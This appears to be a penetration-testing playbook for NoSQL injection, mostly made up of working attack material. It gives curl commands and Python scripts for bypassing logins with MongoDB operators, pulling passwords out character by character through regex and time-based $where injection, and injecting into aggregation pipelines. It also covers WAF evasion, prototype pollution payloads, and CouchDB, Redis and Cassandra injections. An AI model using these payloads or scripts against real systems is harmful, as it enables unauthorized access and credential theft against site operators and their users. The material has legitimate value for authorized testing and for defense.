# NoSQL Injection Playbook

## Indicators

Signs this vulnerability may be present:
- Application uses MongoDB, CouchDB, Redis, Cassandra, or other NoSQL databases
- JSON or BSON data structures in requests/responses
- Parameters with array syntax (e.g., `user[$ne]=`, `password[$gt]=`)
- JavaScript-like syntax in queries or error messages
- Error messages mentioning NoSQL databases or query operators
- API endpoints accepting complex query structures
- Applications built with MEAN/MERN stack (MongoDB, Express, Angular/React, Node.js)

## NoSQL vs SQL Injection

| Aspect | SQL Injection | NoSQL Injection |
|--------|---------------|-----------------|
| Syntax | SQL keywords (SELECT, UNION) | Operators ($ne, $gt, $where) |
| Data format | String-based | JSON/BSON objects |
| Comments | `--`, `/**/`, `#` | Not applicable |
| Logic bypass | `OR 1=1` | `$ne: ""`, `$gt: ""` |
| Code execution | Stored procedures | $where JavaScript |

## Tools

### NoSQLMap

```bash
# Install NoSQLMap
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
pip install -r requirements.txt

# Run NoSQLMap
python nosqlmap.py

# Options:
# 1. Set target host/port
# 2. Set target URL
# 3. Set authentication
# 4. Set injection type
# 5. Run scan
```

### Manual Testing with curl

```bash
# Basic authentication bypass test
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Alternative with URL-encoded form data
curl -X POST "http://target.com/login" \
     -d 'username[$ne]=&password[$ne]='

# Test $gt operator
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$gt": ""}}'

# Test $regex operator
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$regex": ".*"}}'

# Test $where JavaScript injection
curl -X POST "http://target.com/search" \
     -H "Content-Type: application/json" \
     -d '{"$where": "this.username == \"admin\""}'

# Test with $or operator
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$ne": ""}}'
```

### Python Testing Script

```python
#!/usr/bin/env python3
import requests
import json

def test_nosql_injection(url, param_name="password"):
    """Test various NoSQL injection payloads"""

    payloads = [
        # Operator injection
        {"username": "admin", param_name: {"$ne": ""}},
        {"username": "admin", param_name: {"$gt": ""}},
        {"username": "admin", param_name: {"$gte": ""}},
        {"username": "admin", param_name: {"$lt": "~"}},
        {"username": "admin", param_name: {"$regex": ".*"}},
        {"username": "admin", param_name: {"$exists": True}},

        # Username enumeration
        {"username": {"$ne": ""}, param_name: {"$ne": ""}},
        {"username": {"$gt": ""}, param_name: {"$gt": ""}},
        {"username": {"$regex": "^a"}, param_name: {"$ne": ""}},

        # $or bypass
        {"$or": [{"username": "admin"}, {"username": {"$ne": ""}}], param_name: {"$ne": ""}},

        # $and with always true
        {"$and": [{"username": "admin"}, {param_name: {"$ne": ""}}]},

        # $where JavaScript
        {"$where": "1==1"},
        {"$where": "this.username == 'admin'"},
        {"username": {"$where": "1==1"}},
    ]

    for payload in payloads:
        try:
            response = requests.post(url, json=payload, timeout=10)
            print(f"Payload: {json.dumps(payload)}")
            print(f"Status: {response.status_code}")
            print(f"Response: {response.text[:200]}")
            print("-" * 50)
        except Exception as e:
            print(f"Error with payload {payload}: {e}")

# Usage
test_nosql_injection("http://target.com/api/login")
```

## Techniques

### 1. Authentication Bypass

Bypassing login using NoSQL operators.

```bash
# Using $ne (not equal) - bypass with empty string comparison
# Matches all users where password is not empty string
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$ne": ""}}'

# Using $ne with null
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$ne": null}}'

# Using $gt (greater than) - passwords are typically > empty string
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$gt": ""}}'

# Using $regex - match any password
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$regex": ".*"}}'

# Using $exists - password field exists
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$exists": true}}'

# Bypass both username and password
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# URL-encoded form (for non-JSON APIs)
curl -X POST "http://target.com/login" \
     -d 'username=admin&password[$ne]='

curl -X POST "http://target.com/login" \
     -d 'username[$ne]=&password[$ne]='
```

### 2. Data Extraction with $regex

Extracting data character by character using regex.

```python
#!/usr/bin/env python3
import requests
import string

def extract_field(url, username, field="password"):
    """Extract a field value character by character using $regex"""
    extracted = ""
    charset = string.ascii_letters + string.digits + string.punctuation

    while True:
        found = False
        for char in charset:
            # Escape regex special characters
            escaped_char = char
            if char in "\\^$.|?*+()[]{}":
                escaped_char = "\\" + char

            payload = {
                "username": username,
                field: {"$regex": f"^{extracted}{escaped_char}"}
            }

            response = requests.post(url, json=payload, timeout=10)

            # Adjust success condition based on application response
            if "success" in response.text.lower() or response.status_code == 200:
                extracted += char
                print(f"Found: {extracted}")
                found = True
                break

        if not found:
            break

    return extracted

# Usage
password = extract_field("http://target.com/api/login", "admin")
print(f"Extracted password: {password}")
```

```bash
# Manual regex extraction
# Test if password starts with 'a'
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$regex": "^a"}}'

# Test if password starts with 'ad'
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$regex": "^ad"}}'

# Test password length
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$regex": "^.{8}$"}}'
```

### 3. $where JavaScript Injection

Executing JavaScript in MongoDB queries.

```bash
# Basic $where injection
curl -X POST "http://target.com/search" \
     -H "Content-Type: application/json" \
     -d '{"$where": "1==1"}'

# Access document fields
curl -X POST "http://target.com/search" \
     -H "Content-Type: application/json" \
     -d '{"$where": "this.username == \"admin\""}'

# Time-based detection
curl -X POST "http://target.com/search" \
     -H "Content-Type: application/json" \
     -d '{"$where": "sleep(5000)"}'

# Extract data via timing
curl -X POST "http://target.com/search" \
     -H "Content-Type: application/json" \
     -d '{"$where": "if(this.password.match(/^a/)) sleep(5000)"}'

# JavaScript function injection
curl -X POST "http://target.com/search" \
     -H "Content-Type: application/json" \
     -d '{"$where": "function() { return this.role == \"admin\"; }"}'
```

```python
#!/usr/bin/env python3
import requests
import time
import string

def time_based_extraction(url, field="password"):
    """Extract data using time-based $where injection"""
    extracted = ""
    charset = string.ascii_lowercase + string.digits

    while len(extracted) < 50:  # Max length
        found = False
        for char in charset:
            payload = {
                "$where": f"if(this.{field}.charAt({len(extracted)})=='{char}') sleep(2000); else return true;"
            }

            start = time.time()
            try:
                requests.post(url, json=payload, timeout=10)
            except requests.exceptions.Timeout:
                pass
            elapsed = time.time() - start

            if elapsed >= 2:
                extracted += char
                print(f"Found: {extracted}")
                found = True
                break

        if not found:
            break

    return extracted

# Usage
password = time_based_extraction("http://target.com/api/search")
print(f"Extracted: {password}")
```

### 4. Operator Injection in Arrays

Exploiting array-based queries.

```bash
# $in operator - match any value in array
curl -X POST "http://target.com/api/users" \
     -H "Content-Type: application/json" \
     -d '{"role": {"$in": ["admin", "superuser", "root"]}}'

# $nin - not in array
curl -X POST "http://target.com/api/users" \
     -H "Content-Type: application/json" \
     -d '{"role": {"$nin": ["guest", "user"]}}'

# $all - match all elements
curl -X POST "http://target.com/api/products" \
     -H "Content-Type: application/json" \
     -d '{"tags": {"$all": ["sale"]}}'

# $elemMatch - match array elements
curl -X POST "http://target.com/api/orders" \
     -H "Content-Type: application/json" \
     -d '{"items": {"$elemMatch": {"price": {"$gt": 0}}}}'
```

### 5. Aggregation Pipeline Injection

Exploiting MongoDB aggregation framework.

```bash
# Basic aggregation injection
curl -X POST "http://target.com/api/aggregate" \
     -H "Content-Type: application/json" \
     -d '[{"$match": {"$where": "1==1"}}]'

# $lookup to access other collections
curl -X POST "http://target.com/api/aggregate" \
     -H "Content-Type: application/json" \
     -d '[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "user_data"}}]'

# $group to enumerate data
curl -X POST "http://target.com/api/aggregate" \
     -H "Content-Type: application/json" \
     -d '[{"$group": {"_id": "$role", "count": {"$sum": 1}}}]'

# $project to extract fields
curl -X POST "http://target.com/api/aggregate" \
     -H "Content-Type: application/json" \
     -d '[{"$project": {"password": 1, "username": 1}}]'
```

### 6. Blind NoSQL Injection

Confirming injection when responses don't differ.

```python
#!/usr/bin/env python3
import requests
import time

def blind_nosql_test(url):
    """Test for blind NoSQL injection using response differences"""

    # Test 1: Response length difference
    true_payload = {"username": {"$ne": ""}, "password": {"$ne": ""}}
    false_payload = {"username": {"$ne": ""}, "password": "definitelynotthepassword"}

    true_resp = requests.post(url, json=true_payload)
    false_resp = requests.post(url, json=false_payload)

    if len(true_resp.text) != len(false_resp.text):
        print(f"[+] Possible injection: response length differs")
        print(f"    True condition: {len(true_resp.text)} bytes")
        print(f"    False condition: {len(false_resp.text)} bytes")

    # Test 2: Status code difference
    if true_resp.status_code != false_resp.status_code:
        print(f"[+] Possible injection: status code differs")
        print(f"    True condition: {true_resp.status_code}")
        print(f"    False condition: {false_resp.status_code}")

    # Test 3: Time-based with $where
    time_payload = {"$where": "sleep(3000)"}
    start = time.time()
    try:
        requests.post(url, json=time_payload, timeout=10)
    except:
        pass
    elapsed = time.time() - start

    if elapsed >= 3:
        print(f"[+] Time-based injection confirmed: {elapsed:.2f}s delay")

# Usage
blind_nosql_test("http://target.com/api/login")
```

### 7. NoSQL Injection via HTTP Parameters

Injection through URL and form parameters.

```bash
# Array syntax in URL parameters
curl "http://target.com/api/users?role[$ne]=guest"
curl "http://target.com/api/users?role[$in][]=admin&role[$in][]=superuser"
curl "http://target.com/api/users?age[$gt]=0"
curl "http://target.com/api/users?username[$regex]=^admin"

# POST with form data
curl -X POST "http://target.com/login" \
     -d "username=admin&password[$ne]="

curl -X POST "http://target.com/login" \
     -d "username[$gt]=&password[$gt]="

# Multiple operators
curl -X POST "http://target.com/api/search" \
     -d "price[$gt]=0&price[$lt]=1000&category[$ne]=hidden"

# Nested object injection
curl -X POST "http://target.com/api/profile" \
     -H "Content-Type: application/json" \
     -d '{"user": {"$ne": null}, "settings": {"admin": true}}'
```

## MongoDB-Specific Payloads

### Query Operators

```json
// Comparison
{"field": {"$eq": "value"}}     // Equal
{"field": {"$ne": "value"}}     // Not equal
{"field": {"$gt": "value"}}     // Greater than
{"field": {"$gte": "value"}}    // Greater than or equal
{"field": {"$lt": "value"}}     // Less than
{"field": {"$lte": "value"}}    // Less than or equal
{"field": {"$in": ["a", "b"]}}  // In array
{"field": {"$nin": ["a", "b"]}} // Not in array

// Logical
{"$or": [{"a": 1}, {"b": 2}]}
{"$and": [{"a": 1}, {"b": 2}]}
{"$not": {"field": "value"}}
{"$nor": [{"a": 1}, {"b": 2}]}

// Element
{"field": {"$exists": true}}
{"field": {"$type": "string"}}

// Evaluation
{"field": {"$regex": "pattern"}}
{"field": {"$regex": "pattern", "$options": "i"}}  // Case insensitive
{"$where": "javascript code"}
{"$text": {"$search": "text"}}

// Array
{"field": {"$all": ["a", "b"]}}
{"field": {"$elemMatch": {"x": 1}}}
{"field": {"$size": 3}}
```

### Authentication Bypass Payloads

```json
// Basic bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}

// Admin targeting
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

// Using $or
{"$or": [{"username": "admin"}], "password": {"$ne": ""}}

// Type confusion
{"username": "admin", "password": {"$type": 2}}  // String type

// $where bypass
{"$where": "this.username == 'admin'"}
{"$where": "return true"}
```

## Bypass Techniques

### WAF Evasion

```bash
# Unicode encoding
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"\u0024ne": ""}}'

# Case variations (if parser is case-insensitive)
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$NE": ""}}'

# Alternative operators
# Instead of $ne, use $not with $eq
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$not": {"$eq": ""}}}'

# Nested operators
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "$or": [{"password": {"$ne": ""}}, {"password": {"$exists": true}}]}'

# Double encoding in URL parameters
curl "http://target.com/api/users?role%5B%24ne%5D=guest"
```

### Content-Type Manipulation

```bash
# Try different content types
curl -X POST "http://target.com/login" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'username=admin&password[$ne]='

curl -X POST "http://target.com/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": {"$ne": ""}}'

curl -X POST "http://target.com/login" \
     -H "Content-Type: text/plain" \
     -d '{"username": "admin", "password": {"$ne": ""}}'
```

### Prototype Pollution Combined

```json
// Combine with prototype pollution
{
    "username": "admin",
    "password": {"$ne": ""},
    "__proto__": {"isAdmin": true}
}

// Constructor pollution
{
    "username": "admin",
    "password": {"$ne": ""},
    "constructor": {"prototype": {"isAdmin": true}}
}
```

## Other NoSQL Databases

### CouchDB Injection

```bash
# CouchDB uses JSON queries via HTTP API
# Mango query injection
curl -X POST "http://target.com:5984/db/_find" \
     -H "Content-Type: application/json" \
     -d '{"selector": {"username": {"$ne": ""}}}'

# View injection
curl "http://target.com:5984/db/_design/docs/_view/all"

# All docs
curl "http://target.com:5984/db/_all_docs?include_docs=true"
```

### Redis Injection

```bash
# If Redis commands are constructed from user input
# Command injection through EVAL
curl "http://target.com/api?key=test%0d%0aKEYS%20*%0d%0a"

# Lua script injection
curl -X POST "http://target.com/api/eval" \
     -d 'script=return redis.call("KEYS","*")'
```

### Cassandra CQL Injection

```bash
# Similar to SQL injection but with CQL syntax
# String injection
curl "http://target.com/api/users?id=1' OR ''='"

# ALLOW FILTERING bypass
curl "http://target.com/api/users?filter=role='admin' ALLOW FILTERING"
```

## Success Indicators

- Authentication bypass achieved (logged in without valid credentials)
- Data returned for queries that should return empty
- Different response when using operators vs literal strings
- Time delay observed with $where sleep injection
- Error messages revealing MongoDB/NoSQL database
- Extracted data via regex enumeration
- Multiple or all records returned when expecting single record
- Access to administrative functions or other users' data
- Successfully enumerated usernames or other field values
- Aggregation results exposing internal data structures
